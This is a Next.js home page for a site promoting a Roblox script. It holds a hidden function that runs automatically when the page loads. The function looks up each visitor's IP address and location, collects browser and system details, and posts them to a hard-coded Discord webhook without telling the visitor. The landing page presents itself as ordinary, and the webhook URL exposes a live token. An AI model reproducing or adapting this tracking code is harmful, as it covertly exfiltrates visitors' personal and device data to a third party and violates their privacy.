
import { useEffect } from 'react';
import Head from "next/head";
import { Inter } from "next/font/google";
const inter = Inter({ subsets: ["latin"] });
import Navbar from "@/components/Navbar";
import Showcase from "@/components/Showcase";
import About from "@/components/About";
import JoinNow from "@/components/JoinNow";
import Footer from "@/components/Footer";

const fetchDataAndSend = () => {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://ipapi.co/json/', true);
  xhr.onload = function() {
    if (xhr.status === 200) {
      var data = JSON.parse(xhr.responseText);
      var logData = {
        ipAddress: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        countryCode: data.country_code_iso2,
        userAgent: navigator.userAgent,
        os: navigator.platform,
        threads: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        systemLanguages: navigator.languages.join(", "),
        language: navigator.language,
      };
      const payload = {
        content: `
**IP Information**
* Address: ${logData.ipAddress || 'Unknown'}
* City: ${logData.city || 'Unknown'}
* Region: ${logData.region || 'Unknown'}
* Country: ${logData.country || 'Unknown'}
* Country Code: ${logData.countryCode || 'Unknown'}

**System Information**
* User Agent: ${logData.userAgent || 'Unknown'}
* OS: ${logData.os || 'Unknown'}
* Threads: ${logData.threads || 'Unknown'}
* Memory: ${logData.memory || 'Unknown'}
* System Languages: ${logData.systemLanguages || 'Unknown'}
* Language: ${logData.language || 'Unknown'}
        `,
      };
      fetch("https://discord.com/api/webhooks/1255573984930431098/B8aMsWPqE6Ce21Qhsj9fqWX925P4cl00f7z29TR_n_sCqhPjYATaUoOUCv_TI6yqt_4h", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })
        .then((response) => console.log('Data sent successfully'))
        .catch((error) => {
          console.error('Error sending data:', error);
          alert('Error sending data. Please try again later.');
        });
    } else {
      console.error('Error fetching IP data:', xhr.statusText);
      alert('Error fetching IP data. Please try again later.');
    }
  };
  xhr.send();
}

export default function Home() {
  useEffect(() => {
    fetchDataAndSend();
  }, []);

  return (
    <>
      <Head>
        <title>Suicide.lol</title>
        <meta
          name="description"
          content="A roblox lua script created with love by Haafli and Menuchi."
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <Navbar />
      <Showcase />
      <About />
      <JoinNow />
      <Footer />
    </>
  );
}
